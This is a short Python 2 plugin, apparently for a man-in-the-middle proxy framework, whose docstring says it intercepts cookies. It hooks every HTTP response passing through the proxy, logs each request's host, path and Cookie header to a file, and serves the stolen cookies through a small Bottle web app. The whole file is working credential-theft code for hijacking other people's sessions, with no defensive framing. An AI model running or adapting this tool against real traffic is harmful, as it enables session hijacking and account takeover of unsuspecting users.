#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import libs
import bottle

__doc__ = """
截获Cookies
"""

App = bottle.Bottle()

@App.route("/")
def Index():
    return open("cookie.txt","r").read()

def GetCookies(self):
    f=open("cookie.txt","a+")
    if self.Request.Headers.has_key("Cookie"):
        f.write(self.Request.Headers["Host"][0]+self.Request.Path+"\t"+str(self.Request.Headers["Cookie"])+"\r\n")
    f.close()

def Init():
    libs.RegHandleHTTPResponseFunc([("*",GetCookies)])
    libs.RegApp("GetCookies",App)

Init()
